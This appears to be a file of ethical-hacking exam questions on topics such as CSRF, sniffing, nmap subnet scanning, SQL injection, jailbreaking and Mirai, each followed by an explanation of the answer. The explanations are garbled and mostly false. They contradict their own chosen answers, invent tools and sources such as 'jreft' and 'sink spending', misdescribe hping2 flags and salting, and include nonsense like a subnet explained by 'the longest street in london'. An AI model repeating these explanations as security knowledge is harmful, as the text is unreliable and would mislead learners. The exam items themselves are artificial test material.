the correct answer is c. cross-site request forgery is an attack that uses a form to take users back to a site, possibly by referencing references in their cookies. since many users automatically submit those forms by clicking them, the user can be manipulated into executing malicious code. these attacks can be lessened or prevented by using cookies only to maintain a single session and using out-of-band messaging. both server-side request forgery and cross-site request forgery are less descriptive than cross-site scripting, which defines what cross-site is all about. cross-site scripting attacks usually involve some form of injection, and all attack efforts can be scripted. another key point to note here is that the attack is never really “ session hijacking. ” whatever the compromised site is doing, the user is already attached. most of those attacks can be mitigated or prevented by using cookies to maintain a single session and avoiding unused port numbers. server-side request forgery is a longer-term perspective and is a much deeper attack. a hacker could potentially use a lot of information from the user ’ s browsing history, cookies, and other information to target specific individuals. one method to pull that off may be to turn the browser ’ s search and recommendation pages to the hacker ’ s choice. in addition to knowing a lot about cookie management and how to exploit it, the hacker may also use something like jreft ( journal reliable firewall ), which can detect any cookie vulnerability and take steps to fix it. as an aside,"

B.  Modifying and replaying captured network traffic
C.  Collecting unencrypted information about usernames and passwords
D.  Capturing a network traffic for further analysis
","
the correct answer is b. can ’ t be done by passive network sniffing. both symmetric and asymmetric keys can be used to encrypt data. while passive network sniffing can be used to gather information about a target network, and probably almost without exception can be done by analyzing the traffic, it can definitely be done by manipulating and replaying captured network traffic. all of the other answers are related in some way to sniffing, but couldn ’ t be done by passive network sniffing. symmetric and asymmetric keys can be used to encrypt data, but there is still network traffic that can be used to identify an address or network segment. identifying operating systems, services, protocols and devices can be done by active network scanning. passing traffic can be used to gather information about the target network, including usernames and passwords. however, doing it by manipulating and replaying captured network traffic can be very tedious. the idea itself is pretty straightforward : instead of thinking about applications and traffic as source and destination, think about them as owned and broadcast. imagining this makes it much easier to pull source and broadcast traffic. a great resource for helping with this is called sink spending. if you have a source device and can tell the difference between local and broadcast traffic, sink spending means looking at traffic to see how much source traffic can be found. a sink is just a network device that can hold traffic for a long time without doing anything, thus the name sink. spending means investigating a specific address and looking at all the traffic"

C.  Detecting the presence of Snort_inline honeypots
D.  Detecting the presence of Sebek-based honeypots

the correct answer is b. tcp fingerprinting is a function that allows a hacker to identify if any fingerprint exists on a system by using the time-based tcp fingerprinting method. one example of this is where a human detects if any honeypot is using a honeypot. a time-based tcp fingerprinting module on a linux system will check to see if any named tcp fingerprints exist on a system. each named tcp fingerprint exists a certain time, and if it ’ s past a certain time, the module will check if any tcp fingerprint of a particular type exists on a system. an nbt fingerprinting module does almost the same thing : it checks to see if any named tcp fingerprints exist on a system by using the netbios name ( bn ) function. a bn fingerprinting module works in the same way as its named tcp fingerprinting module, except it checks bn as a means of identifying the source. snort_inline is another name for a sniffing tcp fingerprinting module. it does exactly what it sounds like—it identifies if any snort_inline named tcp fingerprint exists on a system. sebek is an id-based detection module that checks to see if any named tcp fingerprint of a certain type exists on a system. in addition to the ones listed here, there are other tcp fingerprinting modules and tools you can use : • tcp-fingerprint - checks to see if any named tcp fingerprints exist on a system. • namedtcpf - checks to see if any named tcp fingerprints exist on"

A.  Man-in-the-disk attack
B.  aLTEr attack
C.  SIM card attack
D.  Spearphone attack
","
the correct answer is d. phone calls from a smartphone are relatively secure, although at all times you should watch for situations where privacy may be possible. one example is the iphone ’ s built-in phone blocker, which can prevent the usage of the phone speaker or loudspeaker function on an iPhone. speech privacy in this scenario would indicate something more personal—maybe even a stolen physical thing. the loudspeaker is a hardware feature of the phone, so it would be related to a physical aspect of the device. this type of theft is mostly physical in nature, but in this case it ’ s almost totally physical. the speaker is part of the phone hardware, so it would be classified as a sim card. the similarity between a sim card and a bluetooth device is often compared to the similarity between a phone and a pen. the sim card is placed inside a phone, so they both travel in the same body. in this attack, the speaker is a physical component of the phone, so it would be classified as such. speech privacy on a smartphone is controlled mainly by the software used for transmitting and receiving calls. external speakers, themselves, are not part of the phone system and don ’ t affect it in any way. therefore, this attack would not be classified as a man-in-the-disk ( mitd ) attack. man-in-the-disk attacks are used to extract sensitive data from a mobile device in order to expose or corrupt it. in other words, the mitd attack is exposing the"

B.  Modification of a request by a proxy between client and server
C.  A browser making a request to a server without the user?s knowledge
D.  A server making a request to another server without the user?s knowledge

the correct answer is d. cross-site request forgery involves an attack on users to pass data back and forth between a client and a server. a malicious user on the client, or even an attacker on the server, could run a cross-site request forgery ( xsf ) and take advantage of the trust between the client and the server. a user on the client sends a request to the server, possibly by clicking a link in the website. while on the client, the user maybe logged in or trusted by the site, so whatever is sending the request may not recognize the difference between the user and a hacker posing as a user. the request may be passed to the server, possibly by using json, xml, or other data serialization. if the request is passed, and that request is allowed by the server, then something is going somewhere it shouldn ’ t. this can be used for session hijacking, authentication leakage, or other attacks. the attacker might also run a cross-site request forgery on the server to gain access to some data. note that a hacker would need rights on the server to be able to run a forgery on both sides ; it ’ s not good if you want to just ignore something on one side and not the other. also, a hacked site and hacked server would be useless. maybe better would be a hacked browser. that says someone could potentially use a third-party browser to visit a website and still get a request forged on the behind-the-browser environment."

switch?
A.  Evil twin attack
B.  DNS cache flooding
C.  MAC flooding
D.  DDoS attack

the correct answer is d. a dns cache poisoning attack works by using a target address or hostname to request a dns resolution. instead of obtaining the real address from the cache, the dns will return an ip from its cache. this can be used as a beginning point for attacking sites. mac flooding uses the mac address of a target to request a dns resolution. then, using something like the ping sweep tool, you ’ ll discover every machine on the target network begins on the same mac address. since dns will return the source of the requested mac address, you ’ ll know where to go next. to really pull off this attack, you ’ ll need a zombie machine. an zombie machine can be anything from a zombie operating system to a facebook, twitter, or other social networking account. the idea is to have the zombie do whatever we want it to. as an aside, a hybrid attack uses both dns and mac flooding. the dns will do its thing, and the mac will flood the switch. then, the attacker will watch to see what comes next. with the next step, the attacker will monitor the traffic between the switch and a mac address site. when we add the whole packet aspect to this, the timing will be even more snicked along the way. as an aside, a syn flood is also a dns and mac attack. the key difference to remember here is that a dns cache flooding attack is a cam table overflow attack. mac flooding is similarly simple, just find the mac"

the correct answer is d. password salting is putting additional information into the power and key used to crack the passwords. unlike dictionaries, which are word lists, password salting uses a process called encryption to make it more difficult for crackers to unlock passwords. there is still some upper limitation on how many attempts are made per password member per unit time, but it ’ s very lower on the attempt count. one way to say password salting is adding random data to the power and key used to crack the passwords. there are two ways to say this on exam question questions—one being “ password salting. ” one way to say it on the real world is using multiple methods to crack the passwords. there are many ways to say lockout accounts under brute force password cracking attempts, but most documents say password salting. a couple of ways to say password salting on your exam question are using lockout accounts under brute force password cracking attempts and password salting. none of the other documents say any things, but all of them say lockout accounts under brute force password cracking attempts. lockout accounts are used when a large number of user attempts to a system causes a lockout message. there is no way to say password salting using lockout accounts under brute force password cracking attempts. the second way to say password salting on your exam question is using password creation formulas to crack passwords. there are several ways to say this on the real world, and the short of it is using multiple"

136,"The network in ABC company is using the network address 192.168.1.64 with mask 255.255.255.192. In the
network the servers are in the addresses 192.168.1.122, 192.168.1.123 and 192.168.1.124. An attacker is
trying to find those servers but he cannot see them in his scanning. The command he is using is: nmap
192.168.1.64/28.
Why he cannot see the servers?
A.  He needs to add the command ??ip address?? just before the IP address
B.  He needs to change the address to 192.168.1.0 with the same mask
C.  He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range
D.  The network must be dawn and the nmap command and IP address are ok
","
the correct answer is c. when the network address is 192.168.1.64 and the mask is 255.255.255.192, only the last bit can be hidden. all other bits can be seen. if the network is dawn and the distance is only 28, then the longest street in london is seeable. in this case 192.168.1.122, 192.168.1.123 and 192.168.1.124 can be seen because they are all on the same street. in no way does a network address change that would require a address scan to see what servers are on the other street. the address 192.168.1.122 is just as hidden as the address 192.168.1.123 or 192.168.1.124. the address 192.168.1.64 can not be seen because the distance is 28. the network must be dawn and the length of the street in london is 64. an nmap command has no effect on that. what the attacker is trying to find is a way to scan all streets in one address range, and the address 192.168.1.64 is the only one that gives this possibility. this is a example of tool usage and network naming in nmap. you should remember the three keys to a successful scan—confidence in the tools themselves and in what they can see, as well as confidence in the"
137,"Ben purchased a new smartphone and received some updates on it through the OTA method. He received two
messages: one with a PIN from the network operator and another asking him to enter the PIN received from
the operator. As soon as he entered the PIN, the smartphone started functioning in an abnormal manner. What
is the type of attack performed on Ben in the above scenario?
A.  Advanced SMS phishing
B.  Bypass SSL pinning
C.  Phishing
D.  Tap 'n ghost attack
","
the correct answer is c. this is another fun, common attack line. the user receives an update from the operator, making a change to the software or releases data from the server. ben probably entered a pin provided by the operator, just as if he were playing a game with a fake url or some fake data. instead of looking at the websites or making a consideration that a website is faulty based on a phishing attempt, he decides to do something for the operator. this is a tap 'n ghost attack, usually referring to an iphone user who somehow maintains track of time on the device and copies the typical status update from the operator the next day. there is really no verification of anything, for any actual attack like this, in the real world. needless to say, tap 'n ghost attacks can be legitimate in the outside world, but being a phishing attack, it ’ s still phishing. security doesn ’ t really need to be any different from the ground up on this topic. the point is that some people just can ’ t resist phishing, whether it ’ s real or fake, in fact, or on a specific type ; all of these cases fall under tap 'n ghost. the point is that phishing is still phishing, no matter what you ’ re throwing at it. as for the particular attack line here, don ’ t forget that in many cases an attacker may simply be looking to confirm a status or change a setting, whether from the end of the user or from"
138,"Attempting an injection attack on a web server based on responses to True/False QUESTION NO:s is called
which of the following?
A.  Compound SQLi
B.  Blind SQLi
C.  Classic SQLi
D.  DMS-specific SQLi
","
the correct answer is a. injection attacks are accomplished using sql because they allow an attacker to query the data base and perform a selection based on the response. if the database is on a system different from the web server, the attack won ’ t work. these are specific attacks, not because classic and blind attacks are unknown, but because they ’ re specific to this exam. once you start injecting into a question on what type of sqli you ’ re talking, there ’ s about a 95 percent chance you ’ ll be right. this type of question is great because you ’ re learning, not because you ’ ll have to practice all the time. but don ’ t get it confused with classic being unique and blind being common. classic is a reference to a method of injecting an attack into a whole scenario, whereas blind is how you ’ d catch an attack without ever actually executing it. therefore, when you are in the midst of an injection attack, use the method that applies. if it ’ s classic, just use the method that ’ s clear to you. you ’ ll be fine. most of the time. but the point is, stay disciplined with these questions. remember the three ways of a sqli attack : injection, bind, command, and then remember that the best method to pull it off in the first place is to know exactly what a sqli is capable of doing. when you get to questions like this, just remember classic = first, best, and when"

C.  Install Cryptcat and encrypt outgoing packets from this server.
D.  Install and use Telnet to encrypt all outgoing traffic from this server.
","
the correct answer is c. a common idss ( risk management system ) will likely check your ip address and probably ask you where you are targeting. they may add any note notes in their system that your activity is suspicious and possibly an intrusion attempt. likely as that, the intrusion detection systems will probably ignore your traffic. the last two options give you the chance to send traffic hidden inside a file, e-mail, or other communication channel. http is being blocked or disrupted at many organizations now day to day, for several reasons, but primarily with regard to encryption. http is the correct answer here because all traffic can be routed via a browser ( due to compatibility issues with other transport protocols ). telnet is a horrible idea here and should be considered such from the start. the following is from url www.exploit-db.com/warehouses/exploit-db/manufacturers/auta/html/9278/1/index.html : “ sending http traffic with a telnet session can result in a denial-of-service for the server you are targeting. telnet is a great start when attempting to gain access to new systems, but it ’ s a horrible idea now. ” assuming you can get the code removed or cached in the first place ( and you should be able to get it removed or cached until you ’ re satisfied with the results of any testing you choose to engage ), you should be able to send traffic hidden inside a file, e-mail, or other communication channel. try use will definitely"

A.  DNS cache snooping
B.  DNSSEC zone walking
C.  DNS tunneling method
D.  DNS enumeration
","
the correct answer is c. dns tunneling is a function that can be used to hide a submission port so it can get away unobserved. the “ hiding ” is accomplished by using dns to point legitimate traffic to a spoofed ip address. the spoofed ip address is put on the local network where the real target is. thinking about which network device will accomplish this is the key to understanding how it is done. once dns knows the spoofed ip and starts issuing traffic for that address, the targeting device ( such as a mac monitor or another tool such as se toolkit ) can watch the traffic just as the target can be watched. there are several reasons why this works, including a simple principle called “ description doesn ’ t matter ”. what that means simply has to do is a web server that can render anything you want, provided it ’ s on a zone that is allowed by dns. this can be as a tool, like cgi, or even a dynamic html site that can be passed all kinds of content you want. a few notes on using dns tunneling should be made here. of course, being the wise guy that you are, you ’ ll recognize this technique can be used for malicious inno-centic as well as goodie-payoff. defeating dns tunneling will not only provide a method to pull nasty mal-ware onto your system, but you ’ ll also be able to track back who sent the malicious code. a simple method to do this is to"
141,"Which iOS jailbreaking technique patches the kernel during the device boot so that it becomes jailbroken after
each successive reboot?
A.  Tethered jailbreaking
B.  Semi-tethered jailbreaking
C.  Untethered jailbreaking
D.  Semi-Untethered jailbreaking
","
the correct answer is b. tethered jailbreaking requires an external power source in the form of a charger or another device that is plugged into the device. the user then relies on the charger to provide power to the device, which would allow the jailbreaking to happen. the charger may limit or patch the kernel during the boot process to ensure the jailbreaking does not cause any damage to the device. semi-tethered jailbreaking allows the user to maintain connectivity to the device after the first round of locks after the jailbreaking is complete. however, plugging into the device after the first round of locks may provide a way for the attacker to access the device after the first round of locks is rolled up by the charger. tethered jailbreaking is a much less common occurrence than semi-tethered and untethered jailbreaking. semi-tethered jailbreaking allows the user to connect to the device after the first round of locks is rolled up by the charger, but only after a pre-defined period of time has passed. for example, half an hour may be expected to reconnect after jailbreaking is complete. untethered jailbreaking involves the user ignoring the charger and connecting directly from the first round of locks to the device after the charger has turned off. this gives the user direct access to the device after the first round of locks is rolled up by the charger. both semi- and untethered jailbreaking should provide the user with the ability to connect to the device after the first round"

A.  hping2 host.domain.com
B.  hping2 --set-ICMP host.domain.com
C.  hping2 -i host.domain.com
D.  hping2 -1 host.domain.com
","
the correct answer is b. the program hping2 is the same as the original hping, but has been enhanced to wrap messages as radio control scanners. you use the syntax shown here : hping2 – set-icmp host.domain.com where the line after the forward slash is the syntax for setting one of the headers in the packet to icmp. the – set switch indicates that you are using the syn, udp, or icmp scanners. you specify host.domain.com in the destination field. with an – 1 switch, you have a single attack. it makes this attack one in which you send one packet, asking for several responses. using the syn/udp switches gives you udp and icmp scanning. you set one per packet by using the – i switch, and you ask for one per address by specifying the – a switch. on the command line, the switches are labeled a, b, and so on, and you can compare the syntax in this way : hping2 host.domain.com – a : execute an arp scan on the target with no target address set hping2 host.domain.com – b : same as a, but ask for udp messages hping2 host.domain.com – c : same as a, but ask for icmp messages hping2 host.domain.com – d : same as c, but ask for udp and icmp scans hping2 host.domain.com – e : same as d, but ask for udp and icmp scans hping2 host.domain.com – f"

the correct answer is a. that operator selects all fields that begin with the input string. example. ext = url ;, inurl = linux ; and site = linux.org will now match only those pages that have the file extension url, have the text linux, and have the string linux.org in their url or inurl name. this operator selects nothing that didn ’ t ask for. google dorks are another web-based operation that can be used to craft query strings into site searches. for example, entering ext = url ; inurl = linux ; and site = linux.org then looking up ext = url ; ext = url ; and site = linux.org then entering the following dork operator, allowing all results with each operator, and then sorting results by date, will show you to search for the word linux in all sites and for file extensions in url and url. dork = ext = url ; dork = inurl = linux ; dork = site = linux.org then looking up the following dork operator, allowing all results with each operator, and then sorting results by date, will return all sites and file extensions url and url. dork = ext = url ; ext = url ; and site = linux.org then looking up the following dork operator, allowing only results with ext = url and site = linux.org, and sorting results by date, will return only pages that entered the world online. dork = ext = url ; ext = url ; and site = linux"

against SQL injection attacks?
A.  Data-driven firewall
B.  Packet firewall
C.  Web application firewall
D.  Stateful firewall
","
the correct answer is b. all firewalls, regardless of type, are used to monitor traffic into and out of the network. some examples of traffic monitoring include application layer firewall, domain firewall, packet firewall, session firewall, and volume firewall. web application firewall is a type of firewall, sometimes called app firewall, that protects against application layer attacks. stateful firewall is another name for packet firewall. a packet firewall is used to analyze headers of traffic to determine whether to allow or block a packet. a domain firewall, however, focuses only on domains—whether www.domain.com or b.com or c.com, for instance, where the server technologies are located and the traffic is named based. a packet firewall, however, will look at the whole packet, including the source and destination addresses, and will make decisions based on them. for example, if your source or destination is ip address is sql.and.sql is a service, you ’ ve probably had a sql injection attack. a packet firewall would watch to see what protocols were being used and, based on that, make a decision about allowing or blocking the traffic. a stateful firewall, however, will look at the entire packet, including the source and destination addresses, and will make a decision based on them. if the source is a linux server and the destination is a windows server, for example, then the stateful firewall might look at the sessions that are created between the two and make a decision based on that. a packet"

the correct answer is c. security models in cyberspace don ’ t really involve keys or encryption at all, sometimes. what she ’ s trying to accomplish is to ensure message integrity and authentication. the whole thing could be handled at the firewall, or even at the end of the network, but the physical location of the target isn ’ t really relavant to security here. what jane is attempting to do is protect against spoofing and session hijacking. the idea itself is great—sending messages encrypted to a server by each endpoint and verifying the messages at the receiving server is fine. what ’ s really interesting is how the security model was implemented so that it can be implemented anywhere. please remember that the assumption with any new tech in the area of security is trust, not confidence. the idea behind security model implementation is this : if you know the type of organization you ’ re dealing with, how we go about implementing security schemes, then you have something to refer to when trying to secure communications over the internet. how do you calculate type in this context? easily, I ’ guess, by examining some permissions a subject has at a target ’ s gateway. the secure object model, developed by john macler ( url.com/wiki/history_of_soom ) about some years back, uses a ring of computers to secure communications. each device in the ring relies on the keys of each of the computers in the ring to encrypt and decrypt messages. it ’ s a robust system, and I mean"

Which attack is being described here?
A.  Desynchronization
B.  Slowloris attack
C.  Session splicing
D.  Phlashing
","
the correct answer is d. phishing is defined as a form of social engineering, where an attacker gains access to information, such as personal information or financial information, via the use of e-mail, social networking sites, or other online communication methods. within a phishing attack, an e-mail is used to notify a recipient that an e-mail address or other information has been stolen and is being sent to a number of recipients. if the recipient opens the e-mail, assuming the information is legitimate, the attacker may gain useful information. among the many methods available to an attacker, phishing uses e-mail because it is a reliable and cost-effective method. just remember that the more times you are sent the e-mail and the more information you receive from the attacker, the more chances you are to see this stuff anywhere else. and, lastly, the source of the e-mail isn ’ t necessarily unimportant. if it ’ s legitimate-looking and sends from an established address, you ’ re okay. basically, it ’ s the content of the e-mail that matters. how many times a user opens an e-mail determines the probability of it being a phishing attack. the sooner a user knows it ’ s a phishing attack and gets removed, the better. just as with other social engineering attacks, resolution of this attack relies on identity and authorization. authentication systems such as password protection and biometrics can help in part with this attack by restricting what the attacker can see and doing a better job of removing"

the correct answer is b. so there is no doubt in my mind it ’ s patch management, but where do you buy patches? more to the point, it ’ s not ever simply to the software vendor. there are several steps in the patching process, and clearly finding the vulnerability responsible for the breach requires studying several things. the vulnerability itself may be known for a long time, waiting for a patch to be available, but without the patch itself, the recovery from this breach will be a tedious, stepwise process. all we need to know for the exam is that patches are part of patch management, and where to buy them is a prime example. there are several steps to patch management, and some of the processes themselves : • identification of vulnerability ( knowledge, analysis, and understanding ) • vulnerability negotiation ( analyzing and negotiating risk and uncertainty ) • mitigation ( control and management of the vulnerability ) • configuration and patch management ( applying configurations, patches, and patches manually ) are a few of the processes listed. all of them should be incorporated into an organized patch management process, and there are several systems that can help. opensource intelligence ( openvil ) is a software company that creates several open sources on security, including security focus, security manager, and security admin. all open sources can be used in patch management, and one of the reasons they are useful is that vendors may have no idea what they ’ re putting into patches. any suspect file can be checked against the contents of any"

the correct answer is d. mirai targets specific components of a modern internet-dominant ecosystem. after infiltration, it uses the devices to propagate and create the botnets that then used to launch which types of attack? the birthday attack uses devices to pass unwanted for password changes. the mitm attack redirects users to malicious sites without their input. the password attack uses the targets to propagate and create bots that can be used to launch an attack. none of the other answers are things mirai does. mirai uses these mechanisms to propagate itself, which takes some inventiveness because they ’ re clearly written down in advance. to pull it off, devices will pass something called a bot to mirai. the bot can then direct the device to propagate and create the botnet the attacker then uses to launch an attack. the mirai malware uses ripple effect, interprocess communication, and tcp session hijacking to propagate and set up a botnet. it ’ s the only malware type that targets specific components of a modern internet-dominant ecosystem. other mirai malware types may launch similarly, but some of them may launch more widely. birthday attacks are a type of mitm attack. mirai uses users to pass unwanted messages ( such as password changes ), which can include a way for the attacker to get paid to “ defend ” the devices. mirai also uses a lot of misconfigured or just generally poor-configured routers. a lot of the time, that ’ s already done for the"

the correct answer is c. ec-council has a couple of years since the mitc attack was added as an attack line by the company. however, the mitc attack is associated with ceh and other organizations with moderate to high confidence. the attack is set up similarly to that scenario. however, starting from the middle of the attack cycle, the mitc attack is started on a client. a malicious operator is interested in the data of the cloud service. he or she can enable a backdoor and other levels of persistence in the attack. therefore, observing the vulnerability and exploiting its vulnerabilities to install backdoors and other things can be part of this attack line as well. more recently, other researchers have been exploring this attack line. however, the focus of their observations and potential exploits is not particularly noteworthy. attacks like this would need credentials to get access to the cloud services in the first place. otherwise, it ’ s just a game of hide and seek. and keep in mind that even after the victim system is accessed, it ’ s still needed to install the backdoor. lastly, mitc attacks can be run “ anywhere ”, not just the cloud service being assessed. therefore, even if the cloud service itself may not be virtualized, the attacker may still want to run the attack there. for example, if the attacker wants to know all sorts of information about the cloud service, it ’ s necessary to run the attack. this does not mean, though, that you"
